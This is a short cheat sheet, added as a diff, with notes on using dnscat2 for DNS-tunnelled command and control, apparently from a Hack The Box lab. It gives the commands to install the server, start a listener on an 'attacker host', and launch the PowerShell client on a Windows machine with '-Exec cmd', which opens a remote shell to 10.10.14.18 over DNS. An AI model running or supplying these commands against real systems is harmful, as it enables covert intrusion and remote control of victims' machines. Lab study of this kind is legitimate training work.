@@ -1,0 +1,33 @@
+############ HELP ############
+dnscat2> ?
+
+
+
+############ OPENING SHELL SESSION ############
+dnscat2> window -i 1
+New window created: 1
+history_size (session) => 1000
+
+
+
+############ INSTALLING ############
+git clone https://github.com/iagox86/dnscat2.git
+cd dnscat2/server/
+sudo gem install bundler
+sudo bundle install
+
+ATTACKER HOST
+sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
+
+CLIENT (LINUX)
+use the client with the dnscat2 project
+
+CLIENT (WINDOWS)
+git clone https://github.com/lukebaggett/dnscat2-powershell.git
+PS C:\htb> Import-Module .\dnscat2.ps1
+PS C:\htb> Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
+
+
+
+
+
